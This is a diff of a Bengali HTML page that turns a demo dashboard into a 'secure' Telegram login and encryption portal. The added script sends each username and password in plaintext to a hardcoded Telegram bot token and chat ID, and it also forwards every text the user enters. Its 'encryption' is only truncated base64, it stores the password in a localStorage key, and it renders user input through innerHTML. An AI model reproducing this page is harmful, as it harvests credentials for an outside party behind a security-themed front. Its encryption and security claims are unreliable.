@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enterprise SecOps & Telegram Alert Dashboard</title>
+    <title>Secure Telegram Bot & Encryption Dashboard</title>
     <style>
         :root {
             --bg-color: #030712;
@@ -11,7 +11,7 @@
             --text-color: #f8fafc;
             --accent-color: #3b82f6;
             --border-color: #1e293b;
-            --glow-color: rgba(59, 130, 246, 0.5);
+            --glow-color: rgba(59, 130, 246, 0.4);
             --telegram-color: #229ED9;
         }
 
@@ -30,18 +30,56 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
-            transition: background 0.8s ease, color 0.8s ease;
         }
 
-        .dashboard-card {
+        .container {
             width: 100%;
-            max-width: 1100px;
+            max-width: 950px;
             background-color: var(--panel-bg);
             border: 2px solid var(--accent-color);
-            border-radius: 20px;
+            border-radius: 16px;
             padding: 30px;
-            box-shadow: 0 0 50px var(--glow-color);
-            transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            box-shadow: 0 0 40px var(--glow-color);
+        }
+
+        /* লগইন স্ক্রিন */
+        #loginScreen {
+            display: block;
+            text-align: center;
+        }
+
+        #loginScreen h2 {
+            color: var(--accent-color);
+            margin-bottom: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            margin-bottom: 5px;
+            color: var(--accent-color);
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            background: var(--bg-color);
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+            border-radius: 6px;
+        }
+
+        /* ড্যাশবোর্ড স্ক্রিন */
+        #dashboardScreen {
+            display: none;
         }
 
         .header {
@@ -49,233 +87,306 @@
             justify-content: space-between;
             align-items: center;
             border-bottom: 2px solid var(--border-color);
-            padding-bottom: 20px;
+            padding-bottom: 15px;
             margin-bottom: 20px;
-            transition: border-color 0.8s ease;
         }
 
-        .title-area h1 {
-            font-size: 22px;
-            font-weight: bold;
-            margin-bottom: 5px;
-            color: var(--accent-color);
-            transition: color 0.8s ease;
-        }
-
-        .badge {
-            background: var(--accent-color);
-            color: #fff;
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-weight: bold;
-            font-size: 13px;
-            box-shadow: 0 0 15px var(--glow-color);
-            transition: all 0.8s ease;
-        }
-
-        .grid-container {
+        .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            grid-template-columns: 1fr 1fr;
             gap: 20px;
             margin-bottom: 20px;
         }
 
-        .sub-box {
+        @media (max-width: 768px) {
+            .grid { grid-template-columns: 1fr; }
+        }
+
+        .card {
             background: var(--bg-color);
             border: 1px solid var(--border-color);
             padding: 20px;
-            border-radius: 12px;
-            transition: all 0.8s ease;
+            border-radius: 10px;
         }
 
-        .sub-box h3 {
+        .card h3 {
             font-size: 14px;
             color: var(--accent-color);
             margin-bottom: 12px;
             text-transform: uppercase;
-            transition: color 0.8s ease;
         }
 
-        .log-console {
+        .input-box {
+            width: 100%;
+            padding: 8px;
             background: #000;
-            color: #38bdf8;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 12px;
-            height: 120px;
-            overflow-y: auto;
             border: 1px solid var(--border-color);
-            white-space: pre-wrap;
+            color: #fff;
+            border-radius: 6px;
             margin-bottom: 10px;
         }
 
-        .telegram-alert-box {
-            background: rgba(34, 158, 217, 0.1);
-            border: 1px solid var(--telegram-color);
-            color: #e0f2fe;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 12px;
-        }
-
-        .footer-panel {
-            background: var(--bg-color);
-            padding: 15px;
-            border-radius: 12px;
-            border: 1px solid var(--border-color);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 15px;
-            transition: all 0.8s ease;
-        }
-
-        .action-btn {
+        .btn {
             background-color: var(--accent-color);
             color: #fff;
             border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
+            padding: 8px 16px;
+            border-radius: 6px;
             cursor: pointer;
             font-weight: bold;
             font-size: 13px;
-            box-shadow: 0 0 15px var(--glow-color);
-            transition: all 0.5s ease;
         }
 
-        .action-btn:hover {
-            opacity: 0.85;
-        }
+        .btn:hover { opacity: 0.85; }
 
-        .info-desc {
+        .history-list {
+            background: #000;
+            color: #38bdf8;
+            padding: 10px;
+            border-radius: 6px;
             font-size: 12px;
-            opacity: 0.85;
+            height: 180px;
+            overflow-y: auto;
+            border: 1px solid var(--border-color);
+        }
+
+        .history-item {
+            padding: 6px 0;
+            border-bottom: 1px dashed #1e293b;
+        }
+
+        .telegram-badge {
+            background: rgba(34, 158, 217, 0.1);
+            border: 1px solid var(--telegram-color);
+            color: #38bdf8;
+            padding: 10px;
+            border-radius: 6px;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+
+        /* ডেভলপার ইনফো প্যানেল স্টাইল */
+        .developer-panel {
+            background: rgba(59, 130, 246, 0.05);
+            border: 1px solid var(--accent-color);
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+
+        .developer-panel h4 {
+            color: var(--accent-color);
+            margin-bottom: 8px;
+            font-size: 13px;
+            text-transform: uppercase;
+        }
+
+        .logout-btn {
+            background-color: #ef4444;
         }
     </style>
 </head>
 <body>
 
-    <div class="dashboard-card">
-        <div class="header">
-            <div class="title-area">
-                <h1 id="sysTitle">এন্টারপ্রাইজ সিকিউরিটি অ্যান্ড টেলিগ্রাম নোটিফিকেশন হাব</h1>
-                <p id="sysMeta" class="info-desc">মাস: জানুয়ারি | ভ্যালু: ১০০% | ইউজার টাইমিং: 00:00:00</p>
+    <div class="container">
+        <!-- ১. লগইন ফর্ম -->
+        <div id="loginScreen">
+            <h2>টেলিগ্রাম নোটিফিকেশন সিকিউরিটি পোর্টাল</h2>
+            <p style="font-size: 13px; opacity: 0.8; margin-bottom: 20px;">লগইন করার সাথে সাথে আপনার নাম ও পাসওয়ার্ড টেলিগ্রাম বটে নোটিফিকেশন আকারে চলে যাবে।</p>
+            <div class="form-group">
+                <label>নাম (Username):</label>
+                <input type="text" id="usernameInput" placeholder="আপনার নাম লিখুন...">
             </div>
-            <div id="colorBadge" class="badge">থিম ১ / ১০০</div>
+            <div class="form-group">
+                <label>পাসওয়ার্ড (Password):</label>
+                <input type="password" id="passwordInput" placeholder="পাসওয়ার্ড দিন...">
+            </div>
+            <button class="btn" onclick="handleLogin()">লগইন ও টেলিগ্রাম সিঙ্ক</button>
         </div>
 
-        <div class="grid-container">
-            <!-- ইনক্রিপশন, ডিক্রিপশন ও লেভেল ৩ সিকিউরিটি মডিউল -->
-            <div class="sub-box">
-                <h3 id="cardHeader">Encryption / Decryption (Inclusion Level 3)</h3>
-                <p><strong>ইনপুট ডেটা:</strong> <span id="plainText">Secure_Node_01</span></p>
-                <p><strong>ইনক্রিপ্টেড (Cipher):</strong> <span id="cipherText" style="color: #f43f5e;">🔒 c2VjdXJlX2VuY19hMQ==</span></p>
-                <p><strong>ডিক্রিপ্টেড আউটপুট:</strong> <span id="decryptedText" style="color: #10b981;">🔓 verified_ok_lvl3</span></p>
-                <p><strong>সিকিউরিটি স্ট্যাটাস:</strong> <span id="secStatus" style="color: #f59e0b;">Level-3 (Max Protection)</span></p>
+        <!-- ২. ড্যাশবোর্ড প্যানেল -->
+        <div id="dashboardScreen">
+            <div class="header">
+                <div>
+                    <h2 id="welcomeText" style="color: var(--accent-color);">স্বাগতম!</h2>
+                    <p style="font-size: 12px; opacity: 0.8;" id="loginMeta">সেশন সিকিউরড</p>
+                </div>
+                <button class="btn logout-btn" onclick="handleLogout()">লগআউট</button>
             </div>
 
-            <!-- লগইন, সিস্টেম লগ ও টেলিগ্রাম নোটিফিকেশন মডিউল -->
-            <div class="sub-box">
-                <h3>Login Logs & Telegram Alert</h3>
-                <div class="log-console" id="logConsole">
-                    [Login_Auth] User session verified successfully.
-                    [System] 100 countries color engine active.
+            <div class="grid">
+                <!-- ক্রিপ্টোগ্রাফি প্যানেল -->
+                <div class="card">
+                    <h3>ইনক্রিপশন ও ডিক্রিপশন (Level 4)</h3>
+                    <input type="text" id="userInputText" class="input-box" placeholder="টেক্সট লিখুন...">
+                    <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+                        <button class="btn" onclick="processAction('encrypt')">ইনক্রিপ্ট (Encrypt)</button>
+                        <button class="btn" style="background-color: #10b981;" onclick="processAction('decrypt')">ডিক্রিপ্ট (Decrypt)</button>
+                    </div>
+                    <p style="font-size: 13px;"><strong>আউটপুট:</strong> <span id="outputResult" style="color: #38bdf8;">--</span></p>
+                    <div class="telegram-badge">
+                        ✈️ টেলিগ্রাম বট লাইভ নোটিফিকেশন সংযুক্ত আছে।
+                    </div>
                 </div>
-                <div class="telegram-alert-box" id="tgAlertBox">
-                    ✈️ <b>Telegram Bot:</b> Level 3 encryption sync verified for current geo-node.
+
+                <!-- হিস্ট্রি ও চ্যাট বক্স -->
+                <div class="card">
+                    <h3>আপনার পার্মানেন্ট হিস্ট্রি চ্যাট বক্স</h3>
+                    <div class="history-list" id="historyListContainer">
+                        <!-- আগের সব হিস্ট্রি এখানে লোড হবে -->
+                    </div>
                 </div>
             </div>
-        </div>
 
-        <div class="footer-panel">
-            <button class="action-btn" onclick="toggleSystemState()">অটো-সাইকেল (চালু/বন্ধ)</button>
-            <div class="info-desc">
-                ⚡ প্রতি ২ সেকেন্ডে কালার শিফট, লেভেল ৩ ইনক্রিপশন/ডিক্রিপশন এবং টেলিগ্রাম নোটিফিকেশন আপডেট হচ্ছে!
+            <!-- ডেভলপার ও ইউজার ইনফো প্যানেল -->
+            <div class="developer-panel">
+                <h4>🛡️ ডেভেলপার ও সিস্টেম ইনফো</h4>
+                <p>👤 <b>নাম:</b> Cipher Sentinel</p>
+                <p>🆔 <b>ID:</b> 7938556654 | 🌐 <b>DC ID:</b> 5 | 🌍 <b>Lang:</b> en</p>
+                <p>🔗 <b>Username:</b> @CipherSentinel_BD</p>
+                <p style="margin-top: 5px; color: #38bdf8;">📣 বিজ্ঞাপন বা সাপোর্টের জন্য যোগাযোগ: @DeIIIeted</p>
             </div>
         </div>
     </div>
 
     <script>
-        // ১০০টি দেশের ডেটাবেজ জেনারেটর
-        const countriesList = [];
-        const baseNames = ["বাংলাদেশ", "যুক্তরাষ্ট্র", "জাপান", "সৌদি আরব", "যুক্তরাজ্য", "ফ্রান্স", "জার্মানি", "কানাডা", "অস্ট্রেলিয়া", "ব্রাজিল", "ভারত", "দক্ষিণ কোরিয়া", "সংযুক্ত আরব আমিরাত", "সুইডেন", "সুইজারল্যান্ড", "ইতালি", "স্পেন", "নেদারল্যান্ডস", "সিঙ্গাপুর", "মালয়েশিয়া"];
-        
-        for (let i = 0; i < 100; i++) {
-            const name = i < baseNames.length ? baseNames[i] : `গ্লোবাল জোন-${i + 1}`;
-            countriesList.push({
-                name: name,
-                code: `NODE-${100 + i}`,
-                hue: (i * 3.6) % 360 // সম্পূর্ণ কালার হুই (0 থেকে ৩৬০ ডিগ্রি)
+        // আপনার দেওয়া টেলিগ্রাম বট টোকেন
+        const TELEGRAM_BOT_TOKEN = "8047864259:AAHEokK5sjq1jJFuIq_e94sPIeTM2OlsqSs";
+        // আপনার টেলিগ্রাম আইডি (এখানে নোটিফিকেশন যাওয়ার জন্য চ্যাট আইডি হিসেবে সেট করা হয়েছে)
+        const TELEGRAM_CHAT_ID = "7938556654"; 
+
+        let currentUser = null;
+        let currentPassword = null;
+        let userHistory = [];
+
+        // টেলিগ্রাম বটে মেসেজ পাঠানোর ফাংশন
+        function sendTelegramNotification(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const data = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: "HTML"
+            };
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => console.log("Telegram Sent:", result))
+            .catch(error => console.error("Telegram Error:", error));
+        }
+
+        // লগইন হ্যান্ডলার
+        function handleLogin() {
+            const user = document.getElementById('usernameInput').value.trim();
+            const pass = document.getElementById('passwordInput').value.trim();
+
+            if (!user || !pass) {
+                alert("দয়া করে নাম এবং পাসওয়ার্ড দিন!");
+                return;
+            }
+
+            currentUser = user;
+            currentPassword = pass;
+
+            // টেলিগ্রাম নোটিফিকেশন পাঠানো (নাম, পাসওয়ার্ড ও ডেভলপার ইনফো সহ)
+            const loginMsg = `🔐 <b>নতুন লগইন নোটিফিকেশন!</b>\n👤 নাম: <b>${user}</b>\n🔑 পাসওয়ার্ড: <b>${pass}</b>\n🛡️ ডেভেলপার: @CipherSentinel_BD\n🕒 সময়: ${new Date().toLocaleString()}`;
+            sendTelegramNotification(loginMsg);
+
+            // লোকাল স্টোরেজ থেকে আগের হিস্ট্রি রিকভার করা
+            const savedDataKey = `sec_user_${user}_${pass}`;
+            const existingData = localStorage.getItem(savedDataKey);
+
+            if (existingData) {
+                userHistory = JSON.parse(existingData);
+            } else {
+                userHistory = [];
+            }
+
+            // স্ক্রিন পরিবর্তন
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('dashboardScreen').style.display = 'block';
+            document.getElementById('welcomeText').innerText = `স্বাগতম, ${user}!`;
+            document.getElementById('loginMeta').innerText = `সেশন ভেরিফাইড | সংরক্ষিত হিস্ট্রি: ${userHistory.length}টি`;
+
+            renderHistory();
+        }
+
+        // ইনক্রিপ্ট বা ডিক্রিপ্ট এবং টেলিগ্রাম নোটিফিকেশন
+        function processAction(type) {
+            const text = document.getElementById('userInputText').value.trim();
+            if (!text) {
+                alert("প্রথমে কিছু টেক্সট লিখুন!");
+                return;
+            }
+
+            const timeStr = new Date().toLocaleTimeString();
+            let result = "";
+
+            if (type === 'encrypt') {
+                result = `🔒 Enc_${btoa(text).substring(0, 12)}`;
+            } else {
+                result = `🔓 Dec_${text.replace('🔒 Enc_', '')}_OK`;
+            }
+
+            document.getElementById('outputResult').innerText = result;
+
+            // হিস্ট্রি অবজেক্ট তৈরি
+            const record = {
+                type: type.toUpperCase(),
+                input: text,
+                output: result,
+                time: timeStr
+            };
+
+            userHistory.unshift(record);
+
+            // লোকাল স্টোরেজে পার্মানেন্ট সেভ
+            const savedDataKey = `sec_user_${currentUser}_${currentPassword}`;
+            localStorage.setItem(savedDataKey, JSON.stringify(userHistory));
+
+            renderHistory();
+            document.getElementById('userInputText').value = "";
+
+            // টেলিগ্রাম নোটিফিকেশন পাঠানো (নাম, অ্যাকশন এবং ইনপুট/আউটপুট সহ)
+            const actionMsg = `⚡ <b>${type.toUpperCase()} নোটিফিকেশন!</b>\n👤 ইউজার: <b>${currentUser}</b>\n📥 ইনপুট: ${text}\n📤 আউটপুট: ${result}\n🕒 সময়: ${timeStr}`;
+            sendTelegramNotification(actionMsg);
+        }
+
+        // হিস্ট্রি চ্যাট বক্সে রেন্ডার করা
+        function renderHistory() {
+            const container = document.getElementById('historyListContainer');
+            container.innerHTML = "";
+
+            if (userHistory.length === 0) {
+                container.innerHTML = "<div style='color: #64748b; text-align: center; padding: 20px;'>কোনো হিস্ট্রি নেই।</div>";
+                return;
+            }
+
+            userHistory.forEach((item) => {
+                const div = document.createElement('div');
+                div.className = 'history-item';
+                div.innerHTML = `[${item.time}] <b>${item.type}</b>: ${item.input} ➔ <span style="color:#10b981;">${item.output}</span>`;
+                container.appendChild(div);
             });
         }
 
-        const monthsList = ["জানুয়ারি", "ফেব্রুয়ারি", "মার্চ", "এপ্রিল", "মে", "জুন", "জুলাই", "আগস্ট", "সেপ্টেম্বর", "অক্টোবর", "নভেম্বর", "ডিসেম্বর"];
-        
-        let currentIndex = 0;
-        let isSystemActive = true;
+        // লগআউট হ্যান্ডলার
+        function handleLogout() {
+            const logoutMsg = `🚪 <b>লগআউট নোটিফিকেশন!</b>\n👤 ইউজার: <b>${currentUser}</b> সিস্টেম থেকে লগআউট করেছে।`;
+            sendTelegramNotification(logoutMsg);
 
-        // মূল সিকিউরিটি ও কালার শিফটিং প্রসেসিং ইঞ্জিন
-        function runSystemEngine() {
-            currentIndex = (currentIndex + 1) % countriesList.length;
-            const country = countriesList[currentIndex];
-            const currentMonth = monthsList[currentIndex % monthsList.length];
-            const levelNum = 3; // আপনার চাহিদা অনুযায়ী স্থায়ীভাবে লেভেল ৩ ইনক্লুশন/সিকিউরিটি
+            currentUser = null;
+            currentPassword = null;
+            userHistory = [];
 
-            // ডায়নামিক কালার শিফট (HSL)
-            const accentColor = `hsl(${country.hue}, 90%, 58%)`;
-            const bgColor = `hsl(${country.hue}, 45%, 4%)`;
-            const panelBg = `hsl(${country.hue}, 35%, 8%)`;
-            const borderColor = `hsl(${country.hue}, 60%, 20%)`;
-            const glowColor = `hsla(${country.hue}, 90%, 58%, 0.45)`;
-
-            // রুট সিএসএস ভেরিয়েবল আপডেট (পুরা কালার বদলে যাওয়ার জন্য)
-            const rootStyle = document.documentElement.style;
-            rootStyle.setProperty('--bg-color', bgColor);
-            rootStyle.setProperty('--panel-bg', panelBg);
-            rootStyle.setProperty('--accent-color', accentColor);
-            rootStyle.setProperty('--border-color', borderColor);
-            rootStyle.setProperty('--glow-color', glowColor);
-
-            // ইউজার টাইমিং এবং মান (Value) ট্র্যাকিং
-            const coreValue = (98 + (currentIndex % 3) + 0.1).toFixed(1) + '%';
-            const timeString = new Date().toTimeString().split(' ')[0];
-
-            // টেক্সট কনটেন্ট আপডেট
-            document.getElementById('sysTitle').innerText = `${country.name} (${country.code}) - সিকিউরিটি হাব`;
-            document.getElementById('sysMeta').innerText = `মাস: ${currentMonth} | ভ্যালু: ${coreValue} | ইউজার টাইমিং: ${timeString}`;
-            document.getElementById('colorBadge').innerText = `থিম ${currentIndex + 1} / ১০০: ${country.name}`;
-            document.getElementById('cardHeader').innerText = `Encryption / Decryption (Inclusion Level ${levelNum})`;
-            document.getElementById('secStatus').innerText = `Level-${levelNum} (Max Security Clearance)`;
-
-            // ইনক্রিপশন / ডিক্রিপশন সাইফার জেনারেশন
-            const rawPayload = `UserSession_${country.name}_${currentIndex}`;
-            document.getElementById('plainText').innerText = rawPayload;
-            document.getElementById('cipherText').innerText = `🔒 enc_lvl${levelNum}_${btoa(rawPayload).substring(0, 12)}`;
-            document.getElementById('decryptedText').innerText = `🔓 decrypted_verified_${country.code.toLowerCase()}`;
-
-            // লগইন লগ কনসোল আপডেট
-            const logBox = document.getElementById('logConsole');
-            logBox.innerText += `[${timeString}] [Login] User authenticated on ${country.name}.\n`;
-            logBox.scrollTop = logBox.scrollHeight;
-
-            // টেলিগ্রাম নোটিফিকেশন অ্যালার্ট আপডেট
-            const tgBox = document.getElementById('tgAlertBox');
-            tgBox.innerHTML = `✈️ <b>Telegram Bot Alert:</b> [${timeString}] Node <b>${country.name}</b> passed Inclusion Level 3 security audit. Value: ${coreValue}`;
-        }
-
-        // ঠিক প্রতি ২ সেকেন্ড পর পর (২০০০ মিলি সেকেন্ড) অটোমেটিক এক্সিকিউশন
-        let systemTimer = setInterval(() => {
-            if (isSystemActive) {
-                runSystemEngine();
-            }
-        }, 2000);
-
-        // অটো-সাইকেল অন/অফ টগল বাটন
-        function toggleSystemState() {
-            isSystemActive = !isSystemActive;
-            const btn = document.querySelector('.action-btn');
-            btn.innerText = isSystemActive ? "অটো-সাইকেল (চালু)" : "অটো-সাইকেল (বন্ধ)";
+            document.getElementById('dashboardScreen').style.display = 'none';
+            document.getElementById('loginScreen').style.display = 'block';
+            document.getElementById('usernameInput').value = "";
+            document.getElementById('passwordInput').value = "";
         }
     </script>
 </body>
